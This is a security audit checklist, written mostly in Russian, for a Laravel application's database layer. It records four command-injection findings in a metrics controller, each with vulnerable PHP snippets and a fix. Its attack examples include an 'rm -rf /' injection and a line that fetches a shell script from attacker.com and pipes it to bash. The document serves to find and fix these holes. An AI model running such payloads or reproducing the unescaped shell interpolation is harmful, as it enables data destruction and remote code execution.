# Database SQL Injection Audit

**Приоритет:** 🔴 Critical
**Статус:** [🔍] В процессе - найдены критические проблемы

---

## Обзор

Проверка на SQL injection уязвимости.

### Ключевые области для проверки:

- Все Eloquent queries
- Raw SQL queries
- Query builders
- Database migrations

---

## Гипотезы для проверки

### Raw Queries

- [✅] **SQLI-001**: Поиск DB::raw() usage - OK (использует bindings)
- [✅] **SQLI-002**: Поиск DB::select() с raw SQL - OK
- [⚠️] **SQLI-003**: Поиск whereRaw() usage - regex injection в ServiceComposeParser
- [✅] **SQLI-004**: Поиск havingRaw() usage - OK
- [✅] **SQLI-005**: Поиск orderByRaw() usage - OK (hardcoded columns)
- [✅] **SQLI-006**: Поиск selectRaw() usage - OK
- [✅] **SQLI-007**: Проверить все raw queries на proper binding - OK

### Query Builder

- [ ] **SQLI-008**: Проверить dynamic column names
- [ ] **SQLI-009**: Проверить dynamic table names
- [ ] **SQLI-010**: Проверить where clauses с user input
- [ ] **SQLI-011**: Проверить order by с user input

### Eloquent

- [ ] **SQLI-012**: Проверить scope methods
- [ ] **SQLI-013**: Проверить relationships queries
- [ ] **SQLI-014**: Проверить $fillable массивы

### Search Functionality

- [ ] **SQLI-015**: Проверить global search implementation
- [ ] **SQLI-016**: Проверить filtering functionality
- [ ] **SQLI-017**: Проверить sorting functionality

### API Parameters

- [ ] **SQLI-018**: Проверить API sorting parameters
- [ ] **SQLI-019**: Проверить API filtering parameters
- [ ] **SQLI-020**: Проверить API pagination parameters

### Model Specific

- [ ] **SQLI-021**: Server model queries
- [ ] **SQLI-022**: Application model queries
- [ ] **SQLI-023**: Database model queries (polymorphic)
- [ ] **SQLI-024**: User/Team model queries

### Database Connections

- [ ] **SQLI-025**: Проверить multiple database connections handling
- [ ] **SQLI-026**: Проверить dynamic connection switching

---

## Findings

### Критические

#### 🔴 CMD-001: Command Injection в Redis KEYS Pattern (DatabaseMetricsController)

**Файл:** [DatabaseMetricsController.php:1345](app/Http/Controllers/Inertia/DatabaseMetricsController.php#L1345)

**Проблема:**
```php
$pattern = $request->input('pattern', '*');
$command = "docker exec {$containerName} redis-cli {$authFlag} --no-auth-warning KEYS '{$pattern}' 2>/dev/null | head -n {$limit}";
$result = trim(instant_remote_process([$command], $server, false) ?? '');
```

User input `$pattern` вставляется напрямую в shell команду **без экранирования**!

**Вектор атаки:**
```bash
# Передать pattern: ' ; rm -rf / ; echo '
# Результат: KEYS ' ; rm -rf / ; echo ''
# Команда rm выполнится!
```

**Рекомендация:**
```php
$pattern = escapeshellarg($request->input('pattern', '*'));
```

**Статус:** [🔧] ИСПРАВЛЕНО - добавлена валидация pattern + escapeshellarg()
**Severity:** CRITICAL - Remote Code Execution

---

#### 🔴 CMD-002: Command Injection в PostgreSQL Query Execution

**Файл:** [DatabaseMetricsController.php:773](app/Http/Controllers/Inertia/DatabaseMetricsController.php#L773)

**Проблема:**
```php
$query = trim($request->input('query'));
$escapedQuery = str_replace("'", "'\"'\"'", $query);  // НЕДОСТАТОЧНО!
$command = "docker exec {$containerName} psql -U {$user} -d {$dbName} -t -A -F '|' -c '{$escapedQuery}' 2>&1";
```

Простая замена `'` на `'"'"'` **НЕ защищает** от:
- Backticks: `` `whoami` ``
- Command substitution: `$(whoami)`

**Вектор атаки:**
```bash
# Передать query: SELECT 1; $(curl http://attacker.com/shell.sh | bash)
# Команда curl выполнится!
```

**Рекомендация:**
Использовать PostgreSQL wire protocol (PDO) вместо shell или `escapeshellarg()`.

**Статус:** [🔧] ИСПРАВЛЕНО - заменено на escapeshellarg() для всех параметров
**Severity:** CRITICAL

---

#### 🔴 CMD-003: Command Injection в MySQL Query Execution

**Файл:** [DatabaseMetricsController.php:800](app/Http/Controllers/Inertia/DatabaseMetricsController.php#L800)

**Проблема:** Аналогично CMD-002
```php
$escapedQuery = str_replace("'", "'\"'\"'", $query);
$command = "docker exec {$containerName} mysql -u root -p'{$password}' -N -B -e '{$escapedQuery}' 2>&1";
```

**Статус:** [🔧] ИСПРАВЛЕНО - заменено на escapeshellarg() для всех параметров
**Severity:** CRITICAL

---

#### 🔴 CMD-004: Command Injection в ClickHouse Query Execution

**Файл:** [DatabaseMetricsController.php:828](app/Http/Controllers/Inertia/DatabaseMetricsController.php#L828)

**Проблема:** Аналогично CMD-002/003
```php
$escapedQuery = str_replace("'", "'\"'\"'", $query);
$command = "docker exec {$containerName} clickhouse-client {$authFlag} -q '{$escapedQuery}' 2>&1";
```

**Статус:** [🔧] ИСПРАВЛЕНО - заменено на escapeshellarg() для всех параметров
**Severity:** CRITICAL

---

### Важные

#### ⚠️ SQLI-003-A: Regex Injection в ServiceComposeParser

**Файл:** [ServiceComposeParser.php:398,430](app/Parsers/ServiceComposeParser.php#L398)

**Проблема:**
```php
->whereRaw('key ~ ?', ['^'.$key->value().'_[0-9]+$'])
```

Если `$key->value()` содержит regex metacharacters (`.`, `*`, `|`, etc), они не экранируются.

**Рекомендация:** Использовать `preg_quote($key->value())` или LIKE вместо regex.

**Статус:** [ ] Оценить риск
**Severity:** MEDIUM

---

### Низкий приоритет

#### ✅ SQLI-007: whereRaw("1 = 0") Anti-pattern

**Файлы:** UserNotification.php:140, Project.php:62,81

**Код:** `$query->whereRaw('1 = 0')`

**Анализ:** Безопасно, но anti-pattern. Лучше `where(false)`.

**Статус:** [✅] Безопасно, низкий приоритет улучшения

---

## Исправления

| ID | Описание | Статус | PR/Commit |
|----|----------|--------|-----------|
| - | - | - | - |

---

## Заметки аудитора

> Дополнительные заметки при проверке
